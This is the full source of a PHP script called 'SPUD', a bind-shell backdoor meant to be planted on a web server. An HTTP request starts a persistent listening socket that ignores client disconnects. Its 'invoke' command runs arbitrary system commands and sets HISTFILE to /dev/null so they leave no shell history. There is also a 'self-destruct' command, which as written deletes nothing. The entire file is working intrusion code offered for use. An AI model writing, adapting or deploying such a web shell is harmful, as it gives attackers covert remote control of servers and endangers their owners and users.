<?php
#region Connetion
$version = "v1.0.0";

ignore_user_abort(true);
set_time_limit(0); //Make sure PHP never stops running unless we tell it to or send a SIGTERM or SIGKILL

$address = (isset($_GET['ip']) && is_string($_GET['ip']) ? $_GET['ip'] : '127.0.0.1'); //Address to open the socket for, 0.0.0.0 for catch-all
$port = (isset($_GET['port']) && is_string($_GET['port']) ? intval($_GET['port']) : 1287); //Defaults to 1287

if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false)
	die("socket_create() failed; " . socket_strerror(socket_last_error()) . "\n");

if (!socket_set_option($sock, SOL_SOCKET, SO_REUSEADDR, 1)) //Necessary on Linux for some god-damn reason
	die("socket_set_option() failed; " . socket_strerror(socket_last_error()) . "\n");

if (socket_bind($sock, $address, $port) === false)
	die("socket_bind() failed; " . socket_strerror(socket_last_error($sock)) . "\n");

if (socket_listen($sock, 5) === false)
	die("socket_listen() failed; " . socket_strerror(socket_last_error($sock)) . "\n");

$user = `whoami`; //Would cause an error on a server with suhosin and exec blacklisted
if(!$user) $user = "Unknown";

if(strpos($user, "\\") !== false)
	$user = explode("\\", $user)[1]; //Windows returns hostname\user for whoami, this is the only way I know of getting the ACTUAL username for PHP on Windows.

$user = trim($user, " \r\n\t"); //Windows also returns a newline after whoami

$host = getenv('HOSTNAME'); //Linux
if(!$host) $host = trim(`hostname`); //Windows and Linux
if(!$host) $host = exec('echo $HOSTNAME'); //Linux fallback
if(!$host) $host = "Unknown";

$pid = getmypid();

$ip = $_SERVER['SERVER_ADDR'];

$closestr = "Running SPUD $version ($pid) on $ip:$port as $user@$host";
$closelen = strlen($closestr);

//Send the necessary headers for the client to end the connection
header("Connection: close");
header("Content-Type: text/plain");
header("Content-Length: " . $closelen);
echo $closestr;
//Flush the contents to the client so as to serve their request
ob_flush();
flush();
if(function_exists("fastcgi_finish_request"))
	if(!fastcgi_finish_request()) die("Could not finish request correctly");
#endregion (Connection)

#region TCP server
#region Commands
function PrepareCommand($name, $desc, $func) {
	return (object)array("Name" => $name, "Description" => $desc, "Action" => $func);
}

$sdstr = "Self-destruct? [y/n] ";
$sdlen = strlen($sdstr);

$pipespec = array( //Pipe information for invoke's proc_open
   0 => array("pipe", "r"), //stdin
   1 => array("pipe", "w"), //stdout
   2 => array("pipe", "w")  //stderr
);

$cmds = Array(
	PrepareCommand("help", "Prints all available commands.", function($args) {
		global $cmds;
		foreach($cmds as $cmdo)
			$out .= sprintf("\x1B[1;37m#\x1B[0;0m %s - %s\n", $cmdo->Name, $cmdo->Description);
		return $out;
	}),
	PrepareCommand("quit", "Terminates your SPUD session.", function($args) { }), //Accounted for in message loop
	PrepareCommand("shutdown", "Stops SPUD and closes the socket.", function($args) { }), //^
	PrepareCommand("ip", "Returns the server IP address.", function($args) use($ip) {
		return $ip;
	}),
	PrepareCommand("hexdump", "Converts text into a hexidecimal string.", function($args) {
		$inpt = implode(" ", $args);
		$len = strlen($inpt);
		
		$out = "";
		for($i = 0; $i < $len; $i++)
			$out .= str_pad(dechex(ord($inpt[$i])), 2, "0", STR_PAD_LEFT) . " "; 
		
		return $out;
	}),
	PrepareCommand("invoke", "Invokes a system command (invoking a shell is possible, however the shell will be canonical meaning programs such as vim and nano will not work)", function($args) {
		global $pipespec, $msgsock, $user;
		
		if(count($args) < 1) return "Missing arguments";
		
		$proc = proc_open(implode(" ", $args), $pipespec, $pipes, null, array("TERM" => "xterm", "USER" => $user, "HISTFILE" => "/dev/null"));
		
		if (!is_resource($proc)) return "Process could not be created";
		
		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		
		$out = "";
		
		while(true) {
			$data = stream_get_contents($pipes[1]);
			$datalen = strlen($data);
			if($datalen > 0)
				socket_write($msgsock, $data, $datalen);
			
			$data = stream_get_contents($pipes[2]);
			$datalen = strlen($data);
			if($datalen > 0)
				socket_write($msgsock, $data, $datalen);
			
			if(!$status = proc_get_status($proc)) {
				$out = "Process status failed";
				break;
			}
			if(!$status["running"]) {
				$out = "\nProcess terminated with code " . $status["exitcode"];
				break;
			}
			
			$socketstatus = @socket_recv($msgsock, $stdin, 2048, MSG_DONTWAIT);
			if($socketstatus === false && socket_last_error($msgsock) != 11) /*11 = EAGAIN*/
				break;
			else if($socketstatus > 0)
				fwrite($pipes[0], $stdin);
			
			usleep(100000);
		}
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($proc);
		
		return $out;
	}),
	PrepareCommand("self-destruct", "Deletes SPUD from the server but leaves the daemon running.", function($args) {
		global $msgsock, $sdstr, $sdlen;
		if (!is_resource($msgsock)) return "";
		
		socket_write($msgsock, $sdstr, $sdlen); //Self-destruct confirmation
		if (($buffer = socket_read($msgsock, 1, PHP_NORMAL_READ)) === false)
			return "";
		
		return (strtolower($buffer) === "y" ? "Self-destruction complete" : "");
	})
);
#endregion (Commands)

/* Prepared messages */
$PS1 = "\x1B[1;37mSPUD \x1B[1;31m>\x1B[0;0m ";
$PS1len = strlen($PS1);

$motd = "\nWelcome to SPUD $version\nRunning on $ip:$port ($pid) as $user@$host\n";
$motdlen = strlen($motd);

$quitmsg = "Goodbye!\n";
$quitlen = strlen($quitmsg);

$shutdownmsg = "Shutting down...\n";
$shutdownlen = strlen($shutdownmsg);

//Client loop
while (true) {
	if (($msgsock = socket_accept($sock)) === false) {
		break;
	}
	socket_write($msgsock, $motd, $motdlen);
	
	//Message loop
	while (true) {
		@socket_write($msgsock, $PS1, $PS1len);
		if (($buffer = @socket_read($msgsock, 2048, PHP_NORMAL_READ)) === false)
			break;
		if (!$buffer = trim($buffer))
			continue;
		
		$command = explode(" ", $buffer);
		$cmd = strtolower(array_shift($command)); //Rip the command name out of the argument array
		
		$output = "empty";
		
		if($cmd === 'quit') {
			socket_write($msgsock, $quitmsg, $quitlen);
			break;
		} else if($cmd === 'shutdown') {
			socket_write($msgsock, $shutdownmsg, $shutdownlen);
			socket_shutdown($msgsock, 2);
			socket_close($msgsock);
			break 2;
		} else { //If it wasn't a special-case command try to find it in the regular command array ($cmds)
			$cmdf = null;
			foreach($cmds as $cmdo) {
				if($cmdo->Name === $cmd) {
					$cmdf = $cmdo->Action;
					break;
				}
			}
			
			if($cmdf === null)
				$output = "Command not found '$cmd'";
			else
				$output = $cmdf($command);
		}
		
		$output .= "\n";
		socket_write($msgsock, $output, strlen($output));
		
		//Exhaust socket buffer because for some god damn reason I can't get the metadata for a socket.
		while(@socket_recv($msgsock, $null, 2048, MSG_DONTWAIT) >= 2048) { };
		//stream_get_contents($msgsock);
	}
	@socket_shutdown($msgsock, 2);
	socket_close($msgsock);
}

@socket_shutdown($sock, 2);
socket_close($sock);
#endregion (TCP server)